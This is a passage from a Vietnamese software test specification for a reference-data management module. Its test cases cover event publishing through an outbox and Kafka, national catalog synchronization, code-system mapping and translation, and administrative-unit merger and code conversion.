- **Bước**
  1. Mở UI-07-12, chọn `LOAI_HINH_TC`, dùng bộ dựng điều kiện chọn `cap_quan_ly = TINH`.
  2. Chuyển sang tab JSON, sửa `limit` thành 5, bấm Chạy (Ctrl+Enter).
  3. Bấm "Sao chép cURL".
- **Mong đợi** Bộ dựng chỉ cho chọn thuộc tính `queryable`. Bước 2 hiển thị `200`, thời gian, 5 dòng ở chế độ Bảng và JSON. Bước 3 đưa vào bộ nhớ tạm lệnh cURL không chứa token thật (dùng biến `$TOKEN`).

#### TC-07-170 · Trình thử API báo lỗi tại chỗ
- **Loại** Âm · **Ưu tiên** P3 · **Tự động** E2E
- **Truy vết** FR-07-032 · UI-07-12 · ERR-07-023, 025
- **Tiền điều kiện / dữ liệu** U-T68-DEV.
- **Bước**
  1. Trong khung JSON, gõ `"op": "regex"`.
  2. Gõ một trường không `queryable` rồi bấm Chạy.
- **Mong đợi** Bước 1: khung mã gạch đỏ ngay khi gõ (kiểm tra theo JSON Schema của DSL ở phía trình duyệt), nút Chạy vẫn bấm được. Bước 2: vùng kết quả hiện `400`, thông điệp tiếng Việt "Thuộc tính `so_bien_che` không cho phép lọc. Các thuộc tính lọc được: viet_tat, cap_quan_ly." và vị trí lỗi được đánh dấu trong khung mã.

### TS-07-14 · Sự kiện và outbox

**Mục tiêu.** Xác nhận mỗi thay đổi đã cam kết sinh đúng một sự kiện CloudEvents qua outbox, đúng topic theo tenant, giữ thứ tự theo danh mục, không chứa dữ liệu bản ghi và không mất khi Kafka hoặc Debezium gián đoạn.

**Phủ.** FR-07-034; EVT-07-01…10; NFR-07-007; DD-11; `asyncapi-rdm.yaml`.

**Tiền điều kiện chung.** IT dùng Testcontainers với Debezium Connect; SIT dùng hạ tầng thật. Bộ tiêu thụ thử nghe mọi topic `t68.rdm.*` và `common.rdm.*`.

#### TC-07-171 · Phát hành sinh đúng một sự kiện đúng lược đồ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-034 · EVT-07-05 · NFR-07-007
- **Tiền điều kiện / dữ liệu** CAT-MUC có bản nháp hợp lệ, `require_approval = false`.
- **Bước**
  1. U-T68-DA1 phát hành bản nháp.
  2. Đọc topic `t68.rdm.catalog.published.v1` trong 10 giây.
- **Mong đợi** Có đúng một dòng mới trong `ph07_rdm.outbox` và đúng một bản tin trên topic, nhận được trong ≤ 5 giây sau cam kết. Tiêu đề `ce_specversion = 1.0`, `ce_type = vn.datahub.rdm.catalog.published.v1`, `ce_source`, `ce_id` là UUID v7, `ce_tenant = T68`; khóa bản tin `T68:MUC_DO_DVC`. Thân hợp lệ theo lược đồ AsyncAPI, có `versionNo`, `effectiveFrom`, `stats`, `breaking`, `snapshotUri`, `schemaHash` và không có mảng bản ghi.

#### TC-07-172 · Giao dịch hoàn tác không sinh sự kiện
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-034 · DD-11
- **Tiền điều kiện / dữ liệu** IT tiêm lỗi sau khi ghi outbox nhưng trước cam kết (ngoại lệ trong `PublishService`).
- **Bước**
  1. Gọi phát hành CAT-MUC.
- **Mong đợi** API trả `500` dạng problem+json; bảng `outbox` không có dòng mới; topic không có bản tin sau 10 giây (EVT: không); phiên bản vẫn ở `DRAFT`.

#### TC-07-173 · Thứ tự sự kiện theo danh mục
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-034 · EVT-07-04, 05, 06
- **Tiền điều kiện / dữ liệu** Danh mục `TC173_DM` mới tạo.
- **Bước**
  1. Lần lượt: trình duyệt, từ chối, trình lại, duyệt, phát hành.
  2. Đọc các topic liên quan, sắp theo `ce_time`.
- **Mong đợi** Mọi bản tin có cùng khóa `T68:TC173_DM` nên nằm cùng phân vùng; thứ tự nhận khớp thứ tự thao tác (submitted, rejected, submitted, published).

#### TC-07-174 · Kafka gián đoạn không làm mất sự kiện
- **Loại** Khả dụng · **Ưu tiên** P1 · **Tự động** Chaos
- **Truy vết** FR-07-034 · NFR-07-007
- **Tiền điều kiện / dữ liệu** SIT; Chaos Mesh dừng ba broker Kafka trong 5 phút.
- **Bước**
  1. Trong lúc Kafka dừng, phát hành 3 danh mục khác nhau.
  2. Khôi phục Kafka.
- **Mong đợi** Ba thao tác phát hành trả `200` (không phụ thuộc Kafka). Sau khi Kafka trở lại, ba sự kiện xuất hiện trong ≤ 60 giây, không trùng `ce_id`. Cảnh báo `RdmOutboxLag` bật trong lúc gián đoạn và tắt sau khi đuổi kịp.

#### TC-07-175 · Sự kiện của COMMON và sự kiện sắp xếp ĐVHC
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-034 · EVT-07-05, EVT-07-10 · FR-07-045
- **Tiền điều kiện / dữ liệu** CAT-DVHC có bản nháp v4 với một sự kiện `MERGE` giả lập.
- **Bước**
  1. U-PA phát hành v4.
  2. Đọc `common.rdm.catalog.published.v1` và `common.rdm.adminunit.reorganized.v1`.
- **Mong đợi** Có một bản tin trên mỗi topic, `ce_tenant = COMMON`; EVT-07-10 có `events[]` với loại, mã nguồn, mã đích, căn cứ. Bộ tiêu thụ của tenant T68 và T01 đều nhận được.

#### TC-07-176 · Sự kiện không lộ sang tenant khác
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** IT · thẻ `tenant-leak`
- **Truy vết** FR-07-034 · FR-00-011
- **Tiền điều kiện / dữ liệu** Bộ tiêu thụ thử dùng chứng thư của T01 với ACL Kafka chỉ cho `t01.*` và `common.*`.
- **Bước**
  1. Phát hành CAT-MUC của T68.
  2. Bộ tiêu thụ T01 cố đăng ký `t68.rdm.catalog.published.v1`.
- **Mong đợi** Bước 2 bị Kafka từ chối (`TopicAuthorizationException`); bộ tiêu thụ T01 không nhận bản tin nào của T68.

### TS-07-15 · Đồng bộ danh mục quốc gia

**Mục tiêu.** Xác nhận vòng đời nguồn đồng bộ và lần đồng bộ theo FRS §4.15: không đổi thì không tạo phiên bản, thay đổi an toàn được tự áp dụng khi bật, thay đổi phá vỡ phải có người xác nhận, lỗi nguồn không làm hỏng dữ liệu đang dùng. Kịch bản thay chức năng kết nối NGSP của Aita (LGC-DMDC-019, LGC-NGSP-006).

**Phủ.** FR-07-035…039; BR-07-011, 012, 017, 027; API-07-055…063, 074; UI-07-09; ERR-07-002, 005, 015, 028, 029, 031; EVT-07-09.

**Tiền điều kiện chung.** WireMock theo mục 2.6; nguồn `SRC-GT` của CAT-GT do U-PA quản lý (`auto_apply = true`, lịch `0 0 2 * * *`). Kiểm thử ở tenant `PLATFORM` cho danh mục COMMON và ở T68 cho danh mục NATIONAL của tỉnh tạo ở TC-07-187.

#### TC-07-177 · Tạo, sửa, tắt nguồn đồng bộ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-035 · API-07-055, 056, 057 · LGC-DMDC-019
- **Tiền điều kiện / dữ liệu** U-PA; danh mục COMMON `TC177_QT` (NATIONAL, chưa có nguồn).
- **Bước**
  1. `POST /sync-sources` với `catalogCode = TC177_QT`, `provider = NDXP_DMDC`, `remoteCatalogId`, `schedule = "0 30 1 * * *"`, `autoApply = false`, `fieldMapping`.
  2. `GET /sync-sources?catalogCode=TC177_QT`.
  3. `PATCH /sync-sources/{id}` với `If-Match` đổi `enabled = false`.
- **Mong đợi** Bước 1 trả `201`, có `ETag`, lịch chạy kế tiếp `nextRunAt` = 01:30 hôm sau giờ Việt Nam. Bước 2 trả nguồn vừa tạo. Bước 3 trả `200`, `nextRunAt = null`. KT: có (SYNC_SOURCE_CREATE, SYNC_SOURCE_UPDATE).

#### TC-07-178 · Nguồn đồng bộ trùng, lịch sai, danh mục không hợp lệ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-035 · ERR-07-002, 003, 009, 018
- **Tiền điều kiện / dữ liệu** `SRC-GT` đã có cho CAT-GT.
- **Bước**
  1. U-PA tạo nguồn thứ hai cùng `provider` cho CAT-GT.
  2. U-PA tạo nguồn với `schedule = "* * * * * *"` (mỗi giây) và với biểu thức sai cú pháp.
  3. U-T68-TA tạo nguồn cho CAT-GT (COMMON).
  4. U-T68-TA tạo nguồn cho CAT-LH (LOCAL).
  5. U-PA sửa `SRC-GT` với `If-Match` cũ.
- **Mong đợi** Bước 1 `409` `ERR-07-002`. Bước 2 `422` `ERR-07-009` (lịch dưới khoảng tối thiểu 1 giờ, cú pháp sai). Bước 3 `403` `ERR-07-003`. Bước 4 `422` `ERR-07-009` (chỉ danh mục NATIONAL hoặc COMMON có nguồn). Bước 5 `412` `ERR-07-018`.

#### TC-07-179 · Lần chạy không có thay đổi
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT, API
- **Truy vết** FR-07-036 · API-07-058, 060 · EVT-07-09
- **Tiền điều kiện / dữ liệu** WireMock `BASE`.
- **Bước**
  1. U-PA gọi `POST /sync-sources/{SRC-GT}:run`.
  2. Thăm dò `GET /sync-runs/{runId}` tới khi kết thúc.
- **Mong đợi** Bước 1 trả `202` kèm `runId`. Lần chạy kết thúc `NO_CHANGE`; không có phiên bản mới; EVT-07-09 phát với `status = NO_CHANGE`. KT: có (SYNC_RUN, người khởi chạy U-PA).

#### TC-07-180 · Thay đổi không phá vỡ được tự áp dụng
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-036 · BR-07-011, 017 · EVT-07-05, 09
- **Tiền điều kiện / dữ liệu** WireMock `RENAMED_2`; `SRC-GT.autoApply = true`.
- **Bước**
  1. Bộ lập lịch kích hoạt lần chạy (IT tua `Clock` tới 02:00).
- **Mong đợi** Lần chạy `APPLIED`; tạo và phát hành phiên bản `origin = SYNC`, 2 bản ghi đổi tên, `effectiveFrom` theo quy tắc BR-07-011; EVT-07-05 và EVT-07-09 phát; tác nhân kiểm toán là `system:rdm-sync`.

#### TC-07-181 · Tắt tự áp dụng thì thay đổi an toàn cũng chờ xác nhận
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-036 · BR-07-017
- **Tiền điều kiện / dữ liệu** WireMock `ADDED_5` cho `DAN_TOC`; nguồn `SRC-DT` có `autoApply = false`.
- **Bước**
  1. Chạy `SRC-DT`.
- **Mong đợi** Lần chạy `PENDING_CONFIRMATION`, `diffStats.added = 5`, `hasBreaking = false`; có bản nháp `origin = SYNC` chiếm suất phiên bản mở của `DAN_TOC`.

#### TC-07-182 · Thay đổi phá vỡ dừng ở chờ xác nhận
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT, API
- **Truy vết** FR-07-036 · BR-07-012, 017 · API-07-060
- **Tiền điều kiện / dữ liệu** WireMock `REMOVED_1`; `SRC-GT.autoApply = true`.
- **Bước**
  1. Chạy `SRC-GT`.
  2. `GET /sync-runs/{runId}` xem danh sách thay đổi.
- **Mong đợi** Lần chạy `PENDING_CONFIRMATION` dù `autoApply = true`; thay đổi mã `3` có `changeType = DEPRECATED`, `breaking = true` (đồng bộ không xóa bản ghi). EVT-07-09 có `hasBreaking = true`. Hộp "Việc của tôi" của người có `PERM-07-sync` nhận việc chờ.

#### TC-07-183 · Xác nhận áp dụng thay đổi phá vỡ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-037 · API-07-061 · UI-07-09 · EVT-07-05
- **Tiền điều kiện / dữ liệu** Lần chạy từ TC-07-182.
- **Bước**
  1. U-PA mở UI-07-09, xem khác biệt, nhập ý kiến, bấm "Xác nhận".
- **Mong đợi** API-07-061 trả `200`; lần chạy `APPLIED`; phiên bản `origin = SYNC` được phát hành với mã `3` ở trạng thái `DEPRECATED`; EVT-07-05 có `breaking = true`. KT: có (SYNC_ACCEPT, ý kiến).

#### TC-07-184 · Từ chối thay đổi
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-037 · API-07-062 · ERR-07-009
- **Tiền điều kiện / dữ liệu** Một lần chạy `PENDING_CONFIRMATION` mới (lặp TC-07-182).
- **Bước**
  1. Gọi `:reject` không có `reason`.
  2. Gọi `:reject` với `reason` 20 ký tự.
- **Mong đợi** Bước 1 `422` `ERR-07-009`. Bước 2 `200`, lần chạy `REJECTED`, bản nháp `origin = SYNC` bị hủy, phiên bản hiện hành giữ nguyên; EVT-07-09 `status = REJECTED`.

#### TC-07-185 · Xác nhận hoặc từ chối lần chạy đã kết thúc
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-037 · ERR-07-029
- **Tiền điều kiện / dữ liệu** Lần chạy `APPLIED` (TC-07-183), `REJECTED` (TC-07-184), `NO_CHANGE` (TC-07-179).
- **Bước**
  1. Gọi `:accept` và `:reject` trên từng lần chạy.
- **Mong đợi** Mọi lời gọi trả `409` `ERR-07-029`; dữ liệu không đổi.

#### TC-07-186 · Nguồn lỗi, quá thời gian hoặc trả dữ liệu hỏng
- **Loại** Âm, Khả dụng · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-036 · ERR-07-028 · EVT-07-09 · NFR-07-013, 014
- **Tiền điều kiện / dữ liệu** WireMock lần lượt `HTTP_500`, `TIMEOUT`, `MALFORMED`.
- **Bước**
  1. Chạy `SRC-GT` với từng trạng thái.
- **Mong đợi** Mỗi lần chạy kết thúc `FAILED`, `errorCode = ERR-07-028` (hai trường hợp đầu) hoặc lỗi kiểm tra dữ liệu nguồn (trường hợp ba); không tạo phiên bản; phiên bản hiện hành vẫn phục vụ tra cứu bình thường; chỉ số `rdm_sync_failed_total` tăng; sau 3 lần thất bại liên tiếp, cảnh báo `RdmSyncFailing` bật; khi `rdm_sync_last_success_timestamp` quá 24 giờ, cảnh báo độ tươi (NFR-07-013) bật.

#### TC-07-187 · Khám phá danh mục quốc gia và đăng ký đồng bộ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-038 · API-07-063, 056 · LGC-NGSP-006
- **Tiền điều kiện / dữ liệu** WireMock trả danh sách 6 danh mục quốc gia, trong đó `TON_GIAO` chưa có ở T68.
- **Bước**
  1. U-T68-TA gọi `GET /national-catalogs`.
  2. Đăng ký đồng bộ `TON_GIAO` vào T68 (tạo danh mục NATIONAL và nguồn trong một thao tác).
- **Mong đợi** Bước 1 trả 6 danh mục, mỗi mục có cờ `alreadyLinked`. Bước 2 trả `201`; tạo danh mục `TON_GIAO` (NATIONAL, `DRAFT`) và nguồn; lần chạy đầu tiên tạo phiên bản 1 chờ xác nhận. EVT-07-01 phát.

#### TC-07-188 · Đăng ký trùng hoặc khi nguồn quốc gia không phản hồi
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-038 · ERR-07-002, 028
- **Tiền điều kiện / dữ liệu** `TON_GIAO` đã đăng ký ở TC-07-187.
- **Bước**
  1. Đăng ký lại `TON_GIAO`.
  2. Chuyển WireMock sang `HTTP_500`, gọi `GET /national-catalogs`.
- **Mong đợi** Bước 1 `409` `ERR-07-002`. Bước 2 `502` `ERR-07-028` dạng problem+json, không lộ địa chỉ NDXP.

#### TC-07-189 · Hai lần chạy cùng lúc trên một nguồn
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-036 · ERR-07-005
- **Tiền điều kiện / dữ liệu** WireMock `TIMEOUT` để lần chạy đầu kéo dài; hai bản sao `dh-data`.
- **Bước**
  1. Gửi đồng thời hai lời gọi `:run` tới hai bản sao.
- **Mong đợi** Đúng một lời gọi trả `202`; lời gọi còn lại trả `409` `ERR-07-005`; bảng `sync_run` chỉ có một dòng `RUNNING` cho nguồn (chỉ mục `uq_sync_run_running`).

#### TC-07-190 · Đề xuất bổ sung bản ghi lên danh mục quốc gia
- **Loại** Dương, Âm · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-039 · API-07-074 · BR-07-025 · ERR-07-003, 026, 028
- **Tiền điều kiện / dữ liệu** Cờ `07.rdm.feature.national-proposal = true` ở T68; WireMock nhận đề xuất và trả mã tiếp nhận.
- **Bước**
  1. U-T68-TA gửi đề xuất 2 bản ghi cho `TON_GIAO`.
  2. Gửi 101 bản ghi trong một đề xuất.
  3. Gửi đề xuất cho CAT-LH (LOCAL).
  4. Tắt cờ tính năng rồi gửi lại bước 1.
- **Mong đợi** Bước 1 `202`, tạo tác vụ `PROPOSAL` ở `SUBMITTED`, sau khi WireMock phản hồi chuyển `ACCEPTED` hoặc `UNKNOWN` theo kịch bản. Bước 2 `400` `ERR-07-026`. Bước 3 `403` `ERR-07-003`. Bước 4 `404` `ERR-07-045` (tính năng tắt nên endpoint không lộ).

### TS-07-16 · Hệ thống mã, ánh xạ và chuyển mã

**Mục tiêu.** Xác nhận người quản lý khai báo được hệ thống mã của HTTT khác, lập bảng ánh xạ có hiệu lực theo thời gian, và luồng tích hợp chuyển mã hai chiều đúng; thay bảng chuyển mã viết cứng trong route Camel của Bus cũ (LGC-BUS-036).

**Phủ.** FR-07-040…043; BR-07-023, 024; API-07-064…071; UI-07-10; ERR-07-002, 004, 007, 018, 026, 027, 030, 033, 034, 045.

**Tiền điều kiện chung.** T68 có hệ thống mã `CS-BHXH-DT` (mã dân tộc của BHXH, giả lập) với 55 ánh xạ tới `DAN_TOC`, trong đó mã `04` ánh xạ hai mã ngoài `DT04`, `DT04B` (quan hệ `NARROWER`) và 3 mã `53`, `54`, `55` chưa ánh xạ. Người ghi mặc định U-T68-IE.

#### TC-07-191 · Tạo, sửa, ngừng hệ thống mã ngoài
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-040 · API-07-064, 065, 066 · LGC-BUS-036
- **Tiền điều kiện / dữ liệu** U-T68-IE.
- **Bước**
  1. `POST /code-systems` với `code = TC191_CS`, `name = "Mã đơn vị của HT-NOIVU"`, `ownerSystem = HT-NOIVU`.
  2. `PATCH /code-systems/TC191_CS` với `If-Match`, đổi `name`.
  3. `PATCH` đặt `status = RETIRED`.
  4. `GET /code-systems?status=ACTIVE`.
- **Mong đợi** Bước 1 `201`; bước 2, 3 `200`; bước 4 không có `TC191_CS`. KT: có cho bước 1…3.

#### TC-07-192 · Hệ thống mã trùng, không quyền, ETag cũ
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-040 · ERR-07-002, 018, 045 · D02-08
- **Tiền điều kiện / dữ liệu** `CS-BHXH-DT` đã có.
- **Bước**
  1. Tạo lại `CS-BHXH-DT`.
  2. U-T68-VW tạo hệ thống mã mới.
  3. Sửa `CS-BHXH-DT` với `If-Match` cũ.
  4. `PATCH /code-systems/KHONG_CO`.
- **Mong đợi** Bước 1 `409` `ERR-07-002`. Bước 2 `403-PQ`. Bước 3 `412` `ERR-07-018`. Bước 4 `404` `ERR-07-045`.

#### TC-07-193 · Ghi lô ánh xạ theo chế độ MERGE và REPLACE
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-041 · API-07-067, 068 · BR-07-023
- **Tiền điều kiện / dữ liệu** `CS-BHXH-DT`.
- **Bước**
  1. `PUT /catalogs/DAN_TOC/mappings/CS-BHXH-DT?mode=MERGE` với 3 ánh xạ cho `53`, `54`, `55` (quan hệ `EQUAL`, `validFrom = 2026-12-01`).
  2. `GET /catalogs/DAN_TOC/mappings?codeSystem=CS-BHXH-DT&at=2026-12-01`.
  3. `PUT ...?mode=REPLACE` với danh sách chỉ gồm 50 ánh xạ.
- **Mong đợi** Bước 1 `200`, `stats.created = 3`. Bước 2 trả 58 ánh xạ (55 + 3). Bước 3 `200`; các ánh xạ không có trong danh sách được đóng hiệu lực (`validTo` = hôm nay) chứ không xóa vật lý; tra lại tại ngày hôm qua vẫn thấy ánh xạ cũ. KT: có (MAPPING_PUT, số ánh xạ theo loại).

#### TC-07-194 · Ánh xạ chồng hiệu lực, tạm thời thiếu lý do, mã không tồn tại
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-041 · BR-07-023, 024 · ERR-07-007, 026, 033, 034
- **Tiền điều kiện / dữ liệu** `DT01` đang ánh xạ tới `01` từ 2024-01-01, không thời hạn.
- **Bước**
  1. Ghi ánh xạ `DT01` → `02` từ 2026-01-01 (giao khoảng với ánh xạ cũ).
  2. Ghi ánh xạ `provisional = true` không có `note`.
  3. Ghi ánh xạ tới mã danh mục `99` không có trong `DAN_TOC`.
  4. Ghi lô 5.001 ánh xạ.
- **Mong đợi** Bước 1 `422` `ERR-07-033`, nêu ánh xạ đang chồng. Bước 2 `422` `ERR-07-034`. Bước 3 `422` hoặc `404` `ERR-07-007` theo phần tử. Bước 4 `400` `ERR-07-026`. Lô lỗi không ghi phần nào (tất cả hoặc không).

#### TC-07-195 · Xóa ánh xạ
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-041 · API-07-069 · ERR-07-027
- **Tiền điều kiện / dữ liệu** Ánh xạ `TC195` tạo trong ca.
- **Bước**
  1. `DELETE /catalogs/DAN_TOC/mappings/CS-BHXH-DT/{id}` với `If-Match`.
  2. Lặp lại bước 1.
- **Mong đợi** Bước 1 `204`, KT: có (MAPPING_DELETE). Bước 2 `404` `ERR-07-027`.

#### TC-07-196 · Chuyển mã chiều TO_CATALOG
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-042 · API-07-070 · LGC-BUS-036
- **Tiền điều kiện / dữ liệu** APP-T68-READ.
- **Bước**
  1. `POST /mappings:translate` với `catalog = DAN_TOC`, `codeSystem = CS-BHXH-DT`, `direction = TO_CATALOG`, `codes = ["DT01","DT04B","KHONG_CO"]`.
- **Mong đợi** `200`; kết quả cùng thứ tự đầu vào: `DT01` `MAPPED` → `01` "Kinh"; `DT04B` `MAPPED` → `04`; `KHONG_CO` `NOT_MAPPED`; `stats` = {MAPPED: 2, NOT_MAPPED: 1}.

#### TC-07-197 · Chuyển mã chiều FROM_CATALOG và bỏ qua ánh xạ tạm thời
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-042 · API-07-070
- **Tiền điều kiện / dữ liệu** Ánh xạ `55` → `DT55` là tạm thời.
- **Bước**
  1. `direction = FROM_CATALOG`, `codes = ["04","55"]`.
  2. Như bước 1 với `includeProvisional = false`.
- **Mong đợi** Bước 1: `04` `MULTIPLE` với `externalCodes` `DT04`, `DT04B`; `55` `MAPPED` có `provisional = true`. Bước 2: `55` `NOT_MAPPED`.

#### TC-07-198 · Chuyển mã lô vượt mức, hệ thống mã không tồn tại, danh mục hạn chế
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-042 · ERR-07-001, 026, 030, 045
- **Tiền điều kiện / dữ liệu** APP-T68-READ; CAT-RES không cấp cho `HT-HOTICH`.
- **Bước**
  1. Gửi 501 mã.
  2. Gửi `codeSystem = KHONG_CO`.
  3. Gửi `catalog = KHONG_CO`.
  4. Gửi `catalog = TRAM_QUAN_TRAC`.
- **Mong đợi** Bước 1 `400` `ERR-07-026`. Bước 2 `404` `ERR-07-045`. Bước 3 `404` `ERR-07-001`. Bước 4 `403` `ERR-07-030`.

#### TC-07-199 · Báo cáo độ phủ ánh xạ và màn ánh xạ
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** API, E2E
- **Truy vết** FR-07-043 · API-07-071 · UI-07-10 · ERR-07-045
- **Tiền điều kiện / dữ liệu** Trạng thái đầu kịch bản (55 bản ghi, 52 có ánh xạ).
- **Bước**
  1. `GET /catalogs/DAN_TOC/mappings/CS-BHXH-DT/coverage`.
  2. Gọi với `csCode = KHONG_CO`.
  3. Mở UI-07-10, bấm thẻ "Chưa ánh xạ", nhập mã ngoài cho `53` trực tiếp trên lưới, lưu.
- **Mong đợi** Bước 1 `200`, `total = 55`, `mapped = 52`, `ratio = 0.945`, danh sách `unmapped` = `53`, `54`, `55`, `multiple` = `04`. Bước 2 `404` `ERR-07-045`. Bước 3: lưới lọc còn 3 dòng; sau khi lưu, thẻ đếm còn 2 và độ phủ 96,4%.

### TS-07-17 · ĐVHC: sắp xếp, chuyển mã, tra theo thời điểm, dòng lịch sử

**Mục tiêu.** Xác nhận Datahub quản lý được danh mục ĐVHC qua đợt sắp xếp 2025 (bỏ cấp huyện, sáp nhập tỉnh, xã) và trả lời đúng câu hỏi chuyển mã cũ sang mới, kể cả trường hợp chia tách không tự quyết được. Dữ liệu giả lập ở mục 2.4.

**Phủ.** FR-07-044…047; BR-07-014, 021, 022, 027; API-07-050…054; UI-07-11; ERR-07-003, 004, 006, 007, 009, 016, 026, 035; EVT-07-10.

**Tiền điều kiện chung.** CAT-DVHC giả lập v1…v3; U-PA ghi; người tra mặc định APP-T68-READ.

#### TC-07-200 · Ghi sự kiện sắp xếp vào bản nháp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-045 · API-07-053, 052 · BR-07-021
- **Tiền điều kiện / dữ liệu** U-PA mở bản nháp v4 của `DVHC`, thêm xã `99301`.
- **Bước**
  1. `POST /catalogs/DVHC/versions/draft/successions` với `type = MERGE`, `fromCodes = ["99101","99102"]`, `toCodes = ["99301"]`, `effectiveDate = 2027-01-01`, `legalBasis = "Nghị quyết giả lập số 03/2026"`.
  2. `GET .../versions/draft/successions`.
- **Mong đợi** Bước 1 `201`; `99101`, `99102` trong bản nháp được đặt `DEPRECATED`, `replacedBy = 99301`, `validTo = 2027-01-01`. Bước 2 trả sự kiện vừa ghi. KT: có (SUCCESSION_CREATE).

#### TC-07-201 · Sự kiện sắp xếp không hợp lệ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-045 · BR-07-021 · ERR-07-035
- **Tiền điều kiện / dữ liệu** Bản nháp v4.
- **Bước**
  1. `MERGE` có một mã nguồn.
  2. `SPLIT` có một mã đích.
  3. Mã nguồn không có trong phiên bản hiện hành.
  4. `RENAME` mà mã đích khác mã nguồn.
  5. Thiếu `legalBasis`.
  6. Sửa tay `replacedBy` của bản ghi ĐVHC qua API-07-028.
- **Mong đợi** Bước 1…5 `422` `ERR-07-035` với lý do cụ thể. Bước 6 `422` `ERR-07-035` ("ĐVHC chỉ ghi kế thừa qua sự kiện sắp xếp").

#### TC-07-202 · Chỉ PLATFORM ghi được ĐVHC; không xóa sự kiện của phiên bản đã phát hành
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-044, 045 · API-07-054 · ERR-07-003, 004
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. U-T68-TA ghi sự kiện vào `DVHC`.
  2. U-PA xóa một sự kiện của v2 (đã phát hành).
  3. U-PA xóa sự kiện TC-07-200 trong bản nháp.
- **Mong đợi** Bước 1 `403` `ERR-07-003`. Bước 2 `409` `ERR-07-004`. Bước 3 `204`, các bản ghi nguồn trở lại `ACTIVE` trong bản nháp.

#### TC-07-203 · Phát hành DVHC bắt buộc qua duyệt và phát sự kiện sắp xếp
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-044 · BR-07-027 · ERR-07-016 · EVT-07-10
- **Tiền điều kiện / dữ liệu** Bản nháp v4 có sự kiện ở TC-07-200.
- **Bước**
  1. U-PA phát hành thẳng (không trình).
  2. U-PA trình; U-PA thứ hai (U-PA2, cùng vai trò) duyệt và phát hành.
- **Mong đợi** Bước 1 `409` `ERR-07-016` (danh mục ĐVHC luôn cần duyệt). Bước 2 thành công; EVT-07-05 và EVT-07-10 phát trên topic `common.*`.

#### TC-07-204 · Chuyển mã một bước và hai bước
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** UT, API
- **Truy vết** FR-07-046 · API-07-051 · BR-07-022
- **Tiền điều kiện / dữ liệu** Mục 2.4.
- **Bước**
  1. `POST /admin-units:convert` với `at = 2026-06-01`, `codes = [{"code":"99001","asOf":"2024-06-01"},{"code":"99005","asOf":"2024-06-01"},{"code":"99004","asOf":"2024-06-01"}]`.
- **Mong đợi** `200`, cùng thứ tự đầu vào: `99001` `MAPPED` → `99101`, `events` một phần tử `MERGE`; `99005` `MAPPED` → `99201`, `events` hai phần tử `RECODE` rồi `MERGE`; `99004` `UNCHANGED` (chỉ đổi tên), `newName` là tên tại 2026-06-01, `newPath` có mã tỉnh `97`.

#### TC-07-205 · Chia tách trả nhiều ứng viên, không tự chọn
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-046 · BR-07-022
- **Tiền điều kiện / dữ liệu** Mục 2.4.
- **Bước**
  1. Chuyển `99003` (`asOf = 2024-06-01`) với `at = 2025-08-01`.
  2. Như trên với `at = 2026-06-01`.
- **Mong đợi** Bước 1 `AMBIGUOUS`, `candidates` = `99102`, `99103` kèm ghi chú địa bàn từ sự kiện `SPLIT`, `newCode = null`. Bước 2 `AMBIGUOUS` với `99102`, `99201`.

#### TC-07-206 · Đơn vị cấp huyện bị bỏ và mã không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-046 · ERR-07-009
- **Tiền điều kiện / dữ liệu** Mục 2.4.
- **Bước**
  1. Chuyển `971` (`asOf = 2024-06-01`) với `at = 2026-06-01`.
  2. Chuyển `12345` (không tồn tại).
  3. Chuyển `99001` với `asOf = 2027-01-01` sau `at = 2026-06-01`.
- **Mong đợi** Bước 1 `NOT_FOUND`, ghi chú "đơn vị đã bị giải thể hoặc bãi bỏ cấp", `newPath` có tỉnh `97`. Bước 2 `NOT_FOUND`. Bước 3 phần tử lỗi `ERR-07-009`, các phần tử khác trong lô vẫn có kết quả.

#### TC-07-207 · Tra ngược mã mới về mã cũ
